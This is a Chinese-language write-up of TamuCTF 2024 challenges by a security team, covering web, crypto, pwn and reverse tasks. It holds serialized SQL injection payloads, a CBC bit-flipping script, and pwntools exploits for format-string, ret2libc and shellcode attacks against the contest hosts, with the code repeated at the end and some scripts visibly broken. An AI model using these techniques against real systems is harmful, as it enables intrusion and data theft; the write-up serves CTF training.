# TamuCTF 2024 Writeup

> 原文: https://www.ctfiot.com/172434.html
> ID: 172434

点击蓝字

关注我们

声明

本文作者：CTF战队本文字数：约6945字

阅读时长：约10分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

CTF战队正在招新~  点击 上方图片了解详情！

❝

TAMUctf 2024 tamuctf.com

Sanity Check

welcome

WEB

Cereal

sql 注入

有guest的账户可以登录

profile.php 有反序列化

config.php的User类有__wakeup，会调用refresh() 进行sql注入

flag 应该是在数据库里

没有waf，跟安卓的sqlite不太像，和mysql更相似

4字段

Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjU3OiI5OTkndW5pb24gc2VsZWN0IChzZWxlY3Qgc3FsIGZyb20gc3FsaXRlX21hc3RlciksMiwzLDQtLSAiO3M6MTE6IgAqAHBhc3N3b3JkIjtzOjMyOiI1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OSI7czoxMDoiACoAcHJvZmlsZSI7Tjt9

flag 是admin的密码

Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjcwOiI5OTkndW5pb24gc2VsZWN0ICAoc2VsZWN0IGdyb3VwX2NvbmNhdChwYXNzd29yZCkgZnJvbSB1c2VycykgLDIsMyw0LS0gIjtzOjExOiIAKgBwYXNzd29yZCI7czozMjoiNWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTkiO3M6MTA6IgAqAHByb2ZpbGUiO047fQ==

Forgotten Password

只看到了recover路由的方法,但是不会这个语言…

想办法把flag发到自己的邮箱

传一个数组进去，第一个是存在的用户，第二个是自己的邮箱

Flipped

CBC翻转字节

from os import environ
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, make_response, Response
from base64 import b64encode, b64decode

import sys
import json

FLAG = environ['FLAG']
PORT = int(environ['PORT'])

default_session = '{"admin": 0, "username": "guest"}'
key = get_random_bytes(AES.block_size)
app = Flask(__name__)

def encrypt(session):
 iv = get_random_bytes(AES.block_size)
 cipher = AES.new(key, AES.MODE_CBC, iv)
 return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size)))

def decrypt(session):
 raw = b64decode(session)
 cipher = AES.new(key, AES.MODE_CBC, raw[:
AES.block_size])
 try:
 return unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode()
 
except Exception:
 return None

@app.route('/')
def index():
 session = request.cookies.get('session')
 if session == None:
 res = Response(open(__file__).read(), mimetype='text/plain')
 res.set_cookie('session', encrypt(default_session).decode())
 return res
 elif (plain_session := decrypt(session)) == default_session:
 return Response(open(__file__).read(), mimetype='text/plain')
 else:
 if plain_session != None:
 try:
 if json.loads(plain_session)['admin'] == True:
 return FLAG
 else:
 return 'You are not an administrator'
 
except Exception:
 return 'You are not an administrator'
 else:
 return 'You are not an administrator'

if __name__ == '__main__':
 app.run('0.0.0.0', PORT)

应该是把 admin:0 改成 1 就行了，js是弱类型语言

{"admin": 0, "us
ername": "guest"
}

16字节一组，admin在第一组，改iv

def encrypt(session):
 iv = get_random_bytes(AES.block_size)
 cipher = AES.new(key, AES.MODE_CBC, iv)
 return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size)))

iv是随机生成的，拼接在aes加密后的内容前面

aes加密输入和输出长度相同，那么iv就是第一组，一共四组

#-*- coding:
utf8 -*-
import base64
import urllib.parse

#iv
#{"admin": 0, "us
#ername": "guest"
#}

cipher = base64.b64decode("TNiZwJ1V0g85nLqM1jfOX1reKVgrHiKB0+bIGYVMheQzedUjeMPnLNurPIrXcu4oLpj9hv44MTY/81gPHaGYLg==")
print(len(cipher))

array_cipher = bytearray(cipher)
iv = array_cipher[0:16]
print(iv)

decode_plain = '{"admin": 0, "username": "guest"}'

#原始明文
plain = '{"admin": 1, "us'

newiv = list(iv)

for i in range(0,16):
 newiv[i] = (ord(plain[i].encode('utf-8')) ^ iv[i] ^ ord(decode_plain[i].encode('utf-8')))

newiv = bytes(newiv)

print('newiv:',base64.b64encode(newiv+cipher[16:]))

cbc的那个异或三个参数分别是修改后的明文，密文中对应的值，原始的明文

Forensics

Deleted

Pwn

Admin Panel

首先可以在输入密码处溢出覆盖format来利用格式化字符串漏洞

通过格式化字符串泄露canary和libc，进入admin函数中栈溢出打ret2libc

 from pwn import *
 context.log_level="debug"
 def exp():
    io = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
    io.recvuntil(b"Login:n")
    io.recvuntil(b"length 16:n")
    io.sendline("admin")
    io.recvuntil(b"length 24:n")
    p = b"secretpass123".ljust(0x20,b"A") + b"%15$p-%17$p"
    io.sendline(p)
    io.recvuntil("adminn")
    canary = int(io.recvuntil(b"-",drop=True),16)
    print("[+]canary:",hex(canary))
    __libc_start_main = int(io.recv(14),16)-235
    libc = ELF("./libc.so.6")
    libc_base = __libc_start_main - libc.sym['__libc_start_main']
    print("[+]libc_base:",hex(libc_base))
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
    rdi_ret = libc_base + 0x23a5f
    io.recvuntil(b"1, 2 or 3:")
    io.sendline(b"2")
    io.recvuntil(b"went wrong:")
    p = b"A"*0x48 + p64(canary) + b"A"*8 + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
    io.sendline(p)
    io.recv()
    io.sendline(b"3")
    io.recvuntil(b"foundn")
    io.sendline(b"cat flag*")
    io.recv()

exp()

Rift

一道fmt，但是把输入放到了bss上，这里先利用fmt泄露pie，libc和stack地址，然后通过修改栈内容来更换需要的地址，把payload写到ret位置，最后修改循环跳出条件ret2libc

 from pwn import *
 context.log_level="debug"
 def exp():
    io = remote("tamuctf.com", 443, ssl=True, sni="rift")
    io.sendline(b"%9$p-%11$p-%13$p.")
    pie = int(io.recvuntil(b"-",drop=True)[-14:],16) - 24 - elf.sym['main']
    __libc_start_main = int(io.recvuntil(b"-",drop=True),16) - 235
    libc = ELF("./libc.so.6")
    libc_base = __libc_start_main - libc.sym['__libc_start_main']
    print("[+]libc_base:",hex(libc_base))
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
    rbp = int(io.recv(14),16) - 0xf8
    rdi_ret = pie + 0x127b
    
    def fmt(addr,data):
        io.sendlineafter(b".n",f"%{(addr)&0xffff}c%13$hn.")
        io.sendlineafter(b".n",f"%{(data)&0xffff}c%39$hn.")
        io.sendlineafter(b".n",f"%{(addr+2)&0xffff}c%13$hn.")
        io.sendlineafter(b".n",f"%{(data>>16)&0xffff}c%39$hn.")
        io.sendlineafter(b".n",f"%{(addr+4)&0xffff}c%13$hn.")
        io.sendlineafter(b".n",f"%{(data>>32)&0xffff}c%39$hn.")

    fmt(rbp+0x8,rdi_ret)
    fmt(rbp+0x10,sh_addr)
    fmt(rbp+0x18,sys_addr)
    io.sendlineafter(b".n",f"%{(rbp-4)&0xffff}c%13$hn.")
    io.sendlineafter(b".n",f"%39$hn")
    io.sendline(b"cat flag*")
    io.recvall()

exp()

Confinement

shellcode类型，有沙箱

程序通过fork一个子进程来执行shellcode，并由返回值的不同打印出不同的内容，利用打印的内容不相同可以尝试盲注，根据打印内容来判断是否正确

mov rdx,{j}
xor dl,byte ptr [r8-0x1290+{i}]
mov rax, 231
mov rdi, rdx
syscall

from pwn import *
context.log_level = 'error'

def exp():
    flag = ""
    error = []
    for i in range(50):
        for j in range(32,128):
            print(f"{i}-{j}:",flag)
            io = remote("tamuctf.com", 443, ssl=True, sni="confinement",timeout=8)
            '''
                mov rdx,{j}
                xor dl,byte ptr [r8-0x1290+{i}]
                mov rax, 231  
                mov rdi, rdx
                syscall
            '''
            p = b"x48xC7xC2"+p8(j)+b"x00x00x00x41x32x90"+p8(0x70+i)
            p +=b"xEDxFFxFFx48xC7xC0xE7x00x00x00x48x89xD7x0Fx05"
            io.sendline(p)
            if b"adios" in io.recv():
                flag+=chr(j)
                break
            io.close()

        if flag[-1] == '}':
            break
              
    print(flag)
    
 exp()

Five

先通过5字节调用read重新写shellcode到mmap开辟的区域，接着返回时顺序执行刚好就可以执行到shellcode

from pwn import *
context.log_level="debug"
context.arch="amd64"
def exp():
    io = remote("tamuctf.com", 443, ssl=True, sni="five")
    shellcode_x64=asm(shellcraft.amd64.sh())
    '''
      xchg rsi,rdx
      syscall
    '''
    io.send(p)
    io.recv()
    io.sendline(b"x90"*5+shellcode_x64)
    io.sendline(b"cat flag*")
    io.recv()
    
exp()

Misc

Lost Tourist

https://www.google.com/maps/@1.2889099,103.8596131,172m/data=!3m1!1e3?entry=ttu

大概的位置

Missing

https://songslikex.com/songs-like/7bz9h87mPr5kARIVdie77S

Reverse

Reveille Petter

用CE修改一下数据就可以出flag

Resistant

函数被加密了，动调解密，看到最里面的函数是一个aes/cbc加密

第一个函数解密后可以看到aes的data

继续动调，让第二个加密的函数自动解密

key和iv都给出了，调试到key和iv异或之后，将数据提取出来，在线解密即可

用给的模板发送数据即可

from pwn import *

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="resistant")
io.sendline(b'N0tUrM0msP4sswd!')
io.recvall()

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjU3OiI5OTkndW5pb24gc2VsZWN0IChzZWxlY3Qgc3FsIGZyb20gc3FsaXRlX21hc3RlciksMiwzLDQtLSAiO3M6MTE6IgAqAHBhc3N3b3JkIjtzOjMyOiI1ZjRkY2MzYjVhYTc2NWQ2MWQ4MzI3ZGViODgyY2Y5OSI7czoxMDoiACoAcHJvZmlsZSI7Tjt9
Tzo0OiJVc2VyIjo0OntzOjg6InVzZXJuYW1lIjtzOjU6Imd1ZXN0IjtzOjI6ImlkIjtzOjcwOiI5OTkndW5pb24gc2VsZWN0ICAoc2VsZWN0IGdyb3VwX2NvbmNhdChwYXNzd29yZCkgZnJvbSB1c2VycykgLDIsMyw0LS0gIjtzOjExOiIAKgBwYXNzd29yZCI7czozMjoiNWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTkiO3M6MTA6IgAqAHByb2ZpbGUiO047fQ==
from os import environ
from hashlib import md5
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from flask import Flask, request, make_response, Response
from base64 import b64encode, b64decode

import sys
import json

FLAG = environ['FLAG']
PORT = int(environ['PORT'])

default_session = '{"admin": 0, "username": "guest"}'
key = get_random_bytes(AES.block_size)
app = Flask(__name__)

def encrypt(session):
 iv = get_random_bytes(AES.block_size)
 cipher = AES.new(key, AES.MODE_CBC, iv)
 return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size)))

def decrypt(session):
 raw = b64decode(session)
 cipher = AES.new(key, AES.MODE_CBC, raw[:
AES.block_size])
 try:
 return unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode()
 
except Exception:
 return None

@app.route('/')
def index():
 session = request.cookies.get('session')
 if session == None:
 res = Response(open(__file__).read(), mimetype='text/plain')
 res.set_cookie('session', encrypt(default_session).decode())
 return res
 elif (plain_session := decrypt(session)) == default_session:
 return Response(open(__file__).read(), mimetype='text/plain')
 else:
 if plain_session != None:
 try:
 if json.loads(plain_session)['admin'] == True:
 return FLAG
 else:
 return 'You are not an administrator'
 
except Exception:
 return 'You are not an administrator'
 else:
 return 'You are not an administrator'

if __name__ == '__main__':
 app.run('0.0.0.0', PORT)
{"admin": 0, "us
ername": "guest"
}
def encrypt(session):
 iv = get_random_bytes(AES.block_size)
 cipher = AES.new(key, AES.MODE_CBC, iv)
 return b64encode(iv + cipher.encrypt(pad(session.encode('utf-8'), AES.block_size)))
#-*- coding:
utf8 -*-
import base64
import urllib.parse

    #iv
#{"admin": 0, "us
    #ername": "guest"
#}

cipher = base64.b64decode("TNiZwJ1V0g85nLqM1jfOX1reKVgrHiKB0+bIGYVMheQzedUjeMPnLNurPIrXcu4oLpj9hv44MTY/81gPHaGYLg==")
print(len(cipher))

array_cipher = bytearray(cipher)
iv = array_cipher[0:16]
print(iv)

decode_plain = '{"admin": 0, "username": "guest"}'

#原始明文
plain = '{"admin": 1, "us'

newiv = list(iv)

for i in range(0,16):
 newiv[i] = (ord(plain[i].encode('utf-8')) ^ iv[i] ^ ord(decode_plain[i].encode('utf-8')))

newiv = bytes(newiv)

print('newiv:',base64.b64encode(newiv+cipher[16:]))
from pwn import *
 context.log_level="debug"
 def exp():
    io = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
    io.recvuntil(b"Login:n")
    io.recvuntil(b"length 16:n")
    io.sendline("admin")
    io.recvuntil(b"length 24:n")
    p = b"secretpass123".ljust(0x20,b"A") + b"%15$p-%17$p"
    io.sendline(p)
    io.recvuntil("adminn")
    canary = int(io.recvuntil(b"-",drop=True),16)
    print("[+]canary:",hex(canary))
    __libc_start_main = int(io.recv(14),16)-235
    libc = ELF("./libc.so.6")
    libc_base = __libc_start_main - libc.sym['__libc_start_main']
    print("[+]libc_base:",hex(libc_base))
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
    rdi_ret = libc_base + 0x23a5f
    io.recvuntil(b"1, 2 or 3:")
    io.sendline(b"2")
    io.recvuntil(b"went wrong:")
    p = b"A"*0x48 + p64(canary) + b"A"*8 + p64(rdi_ret) + p64(sh_addr) + p64(sys_addr)
    io.sendline(p)
    io.recv()
    io.sendline(b"3")
    io.recvuntil(b"foundn")
    io.sendline(b"cat flag*")
    io.recv()

exp()
from pwn import *
 context.log_level="debug"
 def exp():
    io = remote("tamuctf.com", 443, ssl=True, sni="rift")
    io.sendline(b"%9$p-%11$p-%13$p.")
    pie = int(io.recvuntil(b"-",drop=True)[-14:],16) - 24 - elf.sym['main']
    __libc_start_main = int(io.recvuntil(b"-",drop=True),16) - 235
    libc = ELF("./libc.so.6")
    libc_base = __libc_start_main - libc.sym['__libc_start_main']
    print("[+]libc_base:",hex(libc_base))
    sys_addr = libc_base + libc.sym['system']
    sh_addr = libc_base + next(libc.search(b"/bin/shx00"))
    rbp = int(io.recv(14),16) - 0xf8
    rdi_ret = pie + 0x127b
    
    def fmt(addr,data):
        io.sendlineafter(b".n",f"%{(addr)&0xffff}c%13$hn.")
        io.sendlineafter(b".n",f"%{(data)&0xffff}c%39$hn.")
        io.sendlineafter(b".n",f"%{(addr+2)&0xffff}c%13$hn.")
        io.sendlineafter(b".n",f"%{(data>>16)&0xffff}c%39$hn.")
        io.sendlineafter(b".n",f"%{(addr+4)&0xffff}c%13$hn.")
        io.sendlineafter(b".n",f"%{(data>>32)&0xffff}c%39$hn.")

    fmt(rbp+0x8,rdi_ret)
    fmt(rbp+0x10,sh_addr)
    fmt(rbp+0x18,sys_addr)
    io.sendlineafter(b".n",f"%{(rbp-4)&0xffff}c%13$hn.")
    io.sendlineafter(b".n",f"%39$hn")
    io.sendline(b"cat flag*")
    io.recvall()

exp()
mov rdx,{j}
xor dl,byte ptr [r8-0x1290+{i}]
mov rax, 231
mov rdi, rdx
syscall
from pwn import *
context.log_level = 'error'

def exp():
    flag = ""
    error = []
    for i in range(50):
        for j in range(32,128):
            print(f"{i}-{j}:",flag)
            io = remote("tamuctf.com", 443, ssl=True, sni="confinement",timeout=8)
            '''
                mov rdx,{j}
                xor dl,byte ptr [r8-0x1290+{i}]
                mov rax, 231  
                mov rdi, rdx
                syscall
            '''
            p = b"x48xC7xC2"+p8(j)+b"x00x00x00x41x32x90"+p8(0x70+i)
            p +=b"xEDxFFxFFx48xC7xC0xE7x00x00x00x48x89xD7x0Fx05"
            io.sendline(p)
            if b"adios" in io.recv():
                flag+=chr(j)
                break
            io.close()

        if flag[-1] == '}':
            break
              
    print(flag)
    
 exp()
from pwn import *
context.log_level="debug"
context.arch="amd64"
def exp():
    io = remote("tamuctf.com", 443, ssl=True, sni="five")
    shellcode_x64=asm(shellcraft.amd64.sh())
    '''
      xchg rsi,rdx
      syscall
    '''
    io.send(p)
    io.recv()
    io.sendline(b"x90"*5+shellcode_x64)
    io.sendline(b"cat flag*")
    io.recv()
    
exp()
from pwn import *

context.log_level = "debug"
io = remote("tamuctf.com", 443, ssl=True, sni="resistant")
io.sendline(b'N0tUrM0msP4sswd!')
io.recvall()
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/8-1712665076.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1712665076.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/8-1712665076.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1712665077.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1712665077.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1712665078.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/1-1712665078.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1712665078.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1712665079.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1712665079.png)